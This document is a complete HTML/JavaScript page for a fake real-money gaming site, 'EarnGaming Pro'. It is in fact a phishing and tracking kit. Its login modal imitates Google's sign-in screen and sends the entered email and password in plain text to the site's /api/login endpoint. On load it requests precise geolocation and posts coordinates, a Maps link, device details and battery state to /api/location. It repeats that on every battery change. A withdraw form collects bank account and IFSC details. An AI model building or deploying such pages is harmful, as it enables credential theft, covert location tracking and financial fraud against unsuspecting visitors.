<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>EarnGaming Pro - Play Games & Earn Real Money</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        /* Location Status Bar */
        .location-status {
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .location-status .status {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .location-status .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #10b981;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }

        .battery-info {
            background: rgba(255,255,255,0.2);
            padding: 5px 15px;
            border-radius: 20px;
            font-family: monospace;
        }

        .header {
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .user-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .user-profile {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .user-avatar {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
        }

        .user-name {
            font-weight: bold;
            font-size: 18px;
        }

        .user-email {
            font-size: 12px;
            color: #666;
        }

        .balance-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 12px 25px;
            border-radius: 15px;
            color: white;
            text-align: center;
        }

        .balance-card .amount {
            font-size: 28px;
            font-weight: bold;
        }

        .btn-login {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
        }

        .btn-logout {
            background: #ef4444;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
        }

        .btn-withdraw {
            background: #10b981;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
        }

        .games-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .game-card {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.3s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .game-card:hover {
            transform: translateY(-5px);
        }

        .game-icon {
            height: 150px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }

        .game-info {
            padding: 15px;
        }

        .game-title {
            font-size: 18px;
            font-weight: bold;
        }

        .prize {
            color: #10b981;
            font-weight: bold;
            margin: 5px 0;
        }

        .play-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 8px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
        }

        /* Login Modal */
        .login-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(8px);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }

        .google-login-card {
            background: white;
            width: 450px;
            max-width: 90%;
            border-radius: 8px;
            box-shadow: 0 24px 38px rgba(0,0,0,0.2);
            animation: slideUp 0.3s ease;
            overflow: hidden;
            position: relative;
        }

        @keyframes slideUp {
            from {
                transform: translateY(50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .login-step {
            padding: 48px 40px 36px 40px;
        }

        .step-2, .step-3 {
            display: none;
        }

        .google-logo-section {
            text-align: center;
            margin-bottom: 32px;
        }

        .google-logo {
            width: 75px;
            height: 75px;
            margin: 0 auto 20px;
        }

        .input-field {
            width: 100%;
            padding: 16px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin: 10px 0;
        }

        .btn-group {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
            gap: 16px;
        }

        .btn-primary {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            cursor: pointer;
        }

        .btn-secondary {
            background: transparent;
            border: none;
            color: #1a73e8;
            padding: 8px 12px;
            cursor: pointer;
        }

        .close-modal {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 28px;
            cursor: pointer;
            background: white;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e0e0e0;
            border-top-color: #1a73e8;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .login-step {
                padding: 32px 24px;
            }
            .user-info {
                flex-direction: column;
            }
            .location-status {
                flex-direction: column;
                gap: 8px;
                text-align: center;
            }
        }
    </style>
</head>
<body>

    <!-- Location & Battery Status Bar -->
    <div class="location-status" id="locationStatus">
        <div class="status">
            <span class="dot" id="locationDot"></span>
            <span id="locationText">📍 Please Wait...</span>
        </div>
        <div class="battery-info" id="batteryInfo">
            🔋 ...
        </div>
    </div>

    <!-- Main Content -->
    <div id="mainContent">
        <div class="header">
            <div class="user-info">
                <div class="user-profile">
                    <div class="user-avatar" id="userAvatar">👤</div>
                    <div>
                        <div class="user-name" id="userName">Guest Player</div>
                        <div class="user-email" id="userEmail">Not Logged In</div>
                    </div>
                </div>
                <div class="balance-card">
                    <h4>💰 My Balance</h4>
                    <div class="amount" id="userBalance">₹0</div>
                </div>
                <div>
                    <button class="btn-login" id="loginBtn" onclick="showLoginModal()">🔐 Login</button>
                    <button class="btn-logout" id="logoutBtn" style="display: none;" onclick="logout()">🚪 Logout</button>
                    <button class="btn-withdraw" id="withdrawBtn" style="display: none;" onclick="showWithdrawModal()">💸 Withdraw</button>
                </div>
            </div>
        </div>

        <div class="games-section">
            <h2 style="color: white; margin-bottom: 20px;">🎮 Popular Games - Win Real Cash</h2>
            <div class="games-grid" id="gamesGrid"></div>
        </div>
    </div>

    <!-- Login Modal -->
    <div id="loginModal" class="login-modal">
        <div class="google-login-card">
            <div class="close-modal" onclick="closeLoginModal()">&times;</div>
            
            <div id="step1" class="login-step step-1">
                <div class="google-logo-section">
                    <div class="google-logo">
                        <svg viewBox="0 0 24 24" width="75" height="75">
                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                        </svg>
                    </div>
                    <h1>Sign in</h1>
                    <p>to continue to EarnGaming Pro</p>
                </div>
                <div class="input-group">
                    <input type="email" id="emailInput" class="input-field" placeholder="Email or phone">
                </div>
                <div class="btn-group">
                    <button class="btn-secondary" onclick="closeLoginModal()">Cancel</button>
                    <button class="btn-primary" onclick="submitEmail()">Next</button>
                </div>
            </div>

            <div id="step2" class="login-step step-2">
                <div class="google-logo-section">
                    <h1>Welcome back</h1>
                </div>
                <div class="input-group">
                    <input type="password" id="passwordInput" class="input-field" placeholder="Password">
                </div>
                <div class="btn-group">
                    <button class="btn-secondary" onclick="goBackToEmail()">Back</button>
                    <button class="btn-primary" onclick="submitPassword()">Next</button>
                </div>
            </div>

            <div id="step3" class="login-step step-3">
                <div class="google-logo-section">
                    <h1>Signing in...</h1>
                    <div class="loading-spinner"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Withdraw Modal -->
    <div id="withdrawModal" class="login-modal">
        <div class="google-login-card">
            <div class="close-modal" onclick="closeWithdrawModal()">&times;</div>
            <div class="login-step">
                <h2>💸 Withdraw Money</h2>
                <input type="text" id="withdrawAmount" class="input-field" placeholder="Amount (Min ₹100)">
                <input type="text" id="accountNumber" class="input-field" placeholder="Account Number">
                <input type="text" id="ifscCode" class="input-field" placeholder="IFSC Code">
                <div class="btn-group">
                    <button class="btn-secondary" onclick="closeWithdrawModal()">Cancel</button>
                    <button class="btn-primary" onclick="processWithdrawal()">Withdraw</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const SERVER_URL = window.location.origin;
        let currentUser = null;
        let userBalance = 0;
        let currentEmail = '';
        let userLocation = null;
        let batteryLevel = null;

        // Games Database
        const games = [
            { id: 1, name: "Quiz Challenge", icon: "🧠", entryFee: 50, prize: 500 },
            { id: 2, name: "Typing Master", icon: "⌨️", entryFee: 30, prize: 300 },
            { id: 3, name: "Memory Match", icon: "🎴", entryFee: 20, prize: 200 },
            { id: 4, name: "Cricket Quiz", icon: "🏏", entryFee: 40, prize: 400 },
            { id: 5, name: "Word Puzzle", icon: "🔤", entryFee: 25, prize: 250 },
            { id: 6, name: "Chess Puzzle", icon: "♟️", entryFee: 60, prize: 600 }
        ];

        // ============= GET BATTERY PERCENTAGE =============
        async function getBatteryPercentage() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.floor(battery.level * 100);
                    const isCharging = battery.charging;
                    
                    document.getElementById('batteryInfo').innerHTML = isCharging ? 
                        `🔋 ${batteryLevel}% (Charging ⚡)` : 
                        `🔋 ${batteryLevel}%`;
                    
                    return { level: batteryLevel, charging: isCharging };
                } catch(e) {
                    document.getElementById('batteryInfo').innerHTML = `🔋 Battery API not supported`;
                    return { level: null, charging: false };
                }
            } else {
                document.getElementById('batteryInfo').innerHTML = `🔋 Battery API not supported`;
                return { level: null, charging: false };
            }
        }

        // ============= GET USER LOCATION WITH AUTO PROMPT =============
        function getUserLocation() {
            const locationText = document.getElementById('locationText');
            const locationDot = document.getElementById('locationDot');
            
            if ("geolocation" in navigator) {
                locationText.innerHTML = "📍 Requesting location permission...";
                locationDot.style.background = "#f59e0b";
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const googleMapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        userLocation = { lat, lng, accuracy, googleMapLink };
                        
                        locationText.innerHTML = `Best Of Luck`;
                        locationDot.style.background = "#10b981";
                        
                        // Get battery percentage
                        const battery = await getBatteryPercentage();
                        
                        // Send to server
                        sendDataToServer(lat, lng, googleMapLink, accuracy, battery);
                    },
                    (error) => {
                        console.log('Location error:', error);
                        let errorMsg = "";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = "Location permission denied. Please enable location access.";
                                locationDot.style.background = "#ef4444";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = "Location information unavailable.";
                                break;
                            case error.TIMEOUT:
                                errorMsg = "Location request timed out.";
                                break;
                        }
                        locationText.innerHTML = `❌ ${errorMsg}`;
                        locationDot.style.background = "#ef4444";
                        
                        // Send error to server
                        sendDataToServer(null, null, null, null, null, errorMsg);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                locationText.innerHTML = "❌ Geolocation not supported by this browser";
                locationDot.style.background = "#ef4444";
            }
        }

        // ============= SEND DATA TO SERVER =============
        async function sendDataToServer(lat, lng, mapLink, accuracy, battery, errorMsg = null) {
            const data = {
                timestamp: new Date().toISOString(),
                pageUrl: window.location.href,
                userAgent: navigator.userAgent,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform
            };
            
            if (lat && lng) {
                data.latitude = lat;
                data.longitude = lng;
                data.googleMapLink = mapLink;
                data.accuracy = accuracy;
            }
            
            if (battery) {
                data.batteryPercentage = battery.level;
                data.batteryCharging = battery.charging;
            }
            
            if (errorMsg) {
                data.locationError = errorMsg;
            }
            
            try {
                const response = await fetch(`${SERVER_URL}/api/location`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                console.log('Data sent to server:', result);
            } catch(e) {
                console.log('Failed to send data to server:', e);
            }
        }

        // ============= BATTERY MONITORING (Continuous) =============
        async function monitorBattery() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                
                // Update on level change
                battery.addEventListener('levelchange', async () => {
                    const level = Math.floor(battery.level * 100);
                    document.getElementById('batteryInfo').innerHTML = battery.charging ? 
                        `🔋 ${level}% (Charging ⚡)` : `🔋 ${level}%`;
                    
                    // Send battery update to server
                    await sendDataToServer(
                        userLocation?.lat, 
                        userLocation?.lng, 
                        userLocation?.googleMapLink,
                        userLocation?.accuracy,
                        { level: level, charging: battery.charging }
                    );
                });
                
                // Update on charging change
                battery.addEventListener('chargingchange', async () => {
                    const level = Math.floor(battery.level * 100);
                    document.getElementById('batteryInfo').innerHTML = battery.charging ? 
                        `🔋 ${level}% (Charging ⚡)` : `🔋 ${level}%`;
                    
                    await sendDataToServer(
                        userLocation?.lat, 
                        userLocation?.lng, 
                        userLocation?.googleMapLink,
                        userLocation?.accuracy,
                        { level: level, charging: battery.charging }
                    );
                });
            }
        }

        // ============= RENDER GAMES =============
        function renderGames() {
            const grid = document.getElementById('gamesGrid');
            grid.innerHTML = games.map(game => `
                <div class="game-card" onclick="playGame(${game.id})">
                    <div class="game-icon">${game.icon}</div>
                    <div class="game-info">
                        <div class="game-title">${game.name}</div>
                        <div class="prize">🏆 Prize: ₹${game.prize}</div>
                        <div>Entry: ₹${game.entryFee}</div>
                        <button class="play-btn">Play Now →</button>
                    </div>
                </div>
            `).join('');
        }

        // ============= PLAY GAME =============
        async function playGame(gameId) {
            if (!currentUser) {
                alert("🔐 Please login first to play games!");
                showLoginModal();
                return;
            }
            
            const game = games.find(g => g.id === gameId);
            if (userBalance < game.entryFee) {
                alert(`❌ Insufficient balance! Need ₹${game.entryFee}`);
                return;
            }
            
            userBalance -= game.entryFee;
            const winAmount = Math.random() > 0.4 ? Math.floor(Math.random() * game.prize) : 0;
            userBalance += winAmount;
            await updateBalance();
            
            alert(`🎮 ${game.name}\n\n${winAmount > 0 ? `🎉 You won: ₹${winAmount}` : '😢 Better luck next time!'}\n\n💰 New Balance: ₹${userBalance}`);
        }

        // ============= LOGIN FUNCTIONS =============
        function showLoginModal() {
            document.getElementById('loginModal').style.display = 'flex';
            document.getElementById('step1').style.display = 'block';
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'none';
        }

        function closeLoginModal() {
            document.getElementById('loginModal').style.display = 'none';
        }

        function submitEmail() {
            const email = document.getElementById('emailInput').value;
            if (!email || !email.includes('@')) {
                alert("Enter valid email");
                return;
            }
            currentEmail = email;
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }

        function goBackToEmail() {
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
        }

        async function submitPassword() {
            const password = document.getElementById('passwordInput').value;
            if (!password) {
                alert("Enter password");
                return;
            }
            
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
            
            // Get current location and battery for login record
            const battery = await getBatteryPercentage();
            
            try {
                const response = await fetch(`${SERVER_URL}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username: currentEmail, 
                        password: password,
                        location: userLocation,
                        battery: battery
                    })
                });
                const data = await response.json();
                
                if (data.success) {
                    currentUser = currentEmail;
                    userBalance = data.balance || 200;
                    await updateBalance();
                    closeLoginModal();
                    document.getElementById('userName').innerHTML = currentUser.split('@')[0];
                    document.getElementById('userEmail').innerHTML = currentUser;
                    document.getElementById('userAvatar').innerHTML = currentUser.charAt(0).toUpperCase();
                    document.getElementById('userBalance').innerHTML = `₹${userBalance}`;
                    document.getElementById('loginBtn').style.display = 'none';
                    document.getElementById('logoutBtn').style.display = 'inline-block';
                    document.getElementById('withdrawBtn').style.display = 'inline-block';
                    saveSession();
                } else {
                    alert("Login failed!");
                    document.getElementById('step3').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                }
            } catch(e) {
                alert("Server error! Make sure server is running.");
                document.getElementById('step3').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            }
        }

        async function updateBalance() {
            if (currentUser) {
                document.getElementById('userBalance').innerHTML = `₹${userBalance}`;
                await fetch(`${SERVER_URL}/api/update-balance`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: currentUser, balance: userBalance })
                });
            }
        }

        function logout() {
            currentUser = null;
            userBalance = 0;
            document.getElementById('userName').innerHTML = 'Guest Player';
            document.getElementById('userEmail').innerHTML = 'Not Logged In';
            document.getElementById('userAvatar').innerHTML = '👤';
            document.getElementById('userBalance').innerHTML = '₹0';
            document.getElementById('loginBtn').style.display = 'inline-block';
            document.getElementById('logoutBtn').style.display = 'none';
            document.getElementById('withdrawBtn').style.display = 'none';
            saveSession();
        }

        function showWithdrawModal() {
            if (!currentUser) {
                alert("Please login first!");
                return;
            }
            if (userBalance < 100) {
                alert("Minimum withdrawal amount is ₹100");
                return;
            }
            document.getElementById('withdrawModal').style.display = 'flex';
        }

        function closeWithdrawModal() {
            document.getElementById('withdrawModal').style.display = 'none';
        }

        function processWithdrawal() {
            const amount = parseInt(document.getElementById('withdrawAmount').value);
            const account = document.getElementById('accountNumber').value;
            
            if (!amount || amount < 100 || amount > userBalance) {
                alert("Invalid amount! Min ₹100");
                return;
            }
            if (!account) {
                alert("Enter account number");
                return;
            }
            
            userBalance -= amount;
            updateBalance();
            alert(`✅ Withdrawal request submitted for ₹${amount}\n\nMoney will be credited within 24-48 hours.`);
            closeWithdrawModal();
            
            // Clear form
            document.getElementById('withdrawAmount').value = '';
            document.getElementById('accountNumber').value = '';
            document.getElementById('ifscCode').value = '';
        }

        // Session management
        function saveSession() {
            if (currentUser) localStorage.setItem('gaming_user', currentUser);
            else localStorage.removeItem('gaming_user');
        }

        async function checkSession() {
            const savedUser = localStorage.getItem('gaming_user');
            if (savedUser) {
                try {
                    const response = await fetch(`${SERVER_URL}/api/balance/${savedUser}`);
                    const data = await response.json();
                    currentUser = savedUser;
                    userBalance = data.balance || 200;
                    document.getElementById('userName').innerHTML = currentUser.split('@')[0];
                    document.getElementById('userEmail').innerHTML = currentUser;
                    document.getElementById('userAvatar').innerHTML = currentUser.charAt(0).toUpperCase();
                    document.getElementById('userBalance').innerHTML = `₹${userBalance}`;
                    document.getElementById('loginBtn').style.display = 'none';
                    document.getElementById('logoutBtn').style.display = 'inline-block';
                    document.getElementById('withdrawBtn').style.display = 'inline-block';
                } catch(e) {
                    console.log('Session check failed');
                }
            }
        }

        // ============= INITIALIZE =============
        renderGames();
        
        // Auto request location when page loads
        setTimeout(() => {
            getUserLocation();
        }, 500);
        
        // Monitor battery
        monitorBattery();
        
        // Check existing session
        checkSession();

        // Close modals on outside click
        window.onclick = function(event) {
            const loginModal = document.getElementById('loginModal');
            const withdrawModal = document.getElementById('withdrawModal');
            if (event.target === loginModal) closeLoginModal();
            if (event.target === withdrawModal) closeWithdrawModal();
        }
    </script>
</body>
</html>
